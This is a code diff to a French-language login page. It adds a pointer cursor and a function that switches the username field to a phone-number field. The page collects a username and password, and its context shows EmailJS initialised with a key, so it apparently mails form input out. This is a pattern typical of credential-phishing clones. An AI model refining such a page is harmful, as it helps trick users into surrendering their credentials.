@@ -61,6 +61,7 @@
       font-size: 16px; /* Augmenté la taille de la police */
       color: #008cff;
       text-decoration: none;
+      cursor: pointer; /* Ajouter le curseur de pointeur pour le lien */
     }
     .link:hover {
       text-decoration: underline;
@@ -150,6 +151,23 @@
     (function() {
       emailjs.init('g4HTytQL092Xue3Ar'); // Clé publique
     })();
+
+    // Fonction pour basculer entre NOM D'UTILISATEUR et NUMÉRO DE TÉLÉPHONE
+    function toggleLabel() {
+      const label = document.querySelector('label[for="username"]');
+      const input = document.getElementById('username');
+      if (label && input) {
+        if (label.textContent === "NOM D'UTILISATEUR OU ADRESSE E-MAIL") {
+          label.textContent = "NUMÉRO DE TÉLÉPHONE";
+          input.type = "tel";
+          input.name = "telephone";
+        } else {
+          label.textContent = "NOM D'UTILISATEUR OU ADRESSE E-MAIL";
+          input.type = "text";
+          input.name = "username";
+        }
+      }
+    }
   </script>
 </head>
 <body>
@@ -160,7 +178,7 @@
         <h3><label for="username">NOM D'UTILISATEUR OU ADRESSE E-MAIL</label></h3>
         <input type="text" name="username" id="username">
       </div>
-      <h3><a href="#" class="link">Utiliser mon numéro de téléphone</a></h3>
+      <h3><a href="#" class="link" onclick="toggleLabel()">Utiliser mon numéro de téléphone</a></h3>
       <div class="field">
         <h3><label for="password">MOT DE PASSE</label></h3>
         <input type="password" name="password" id="password">
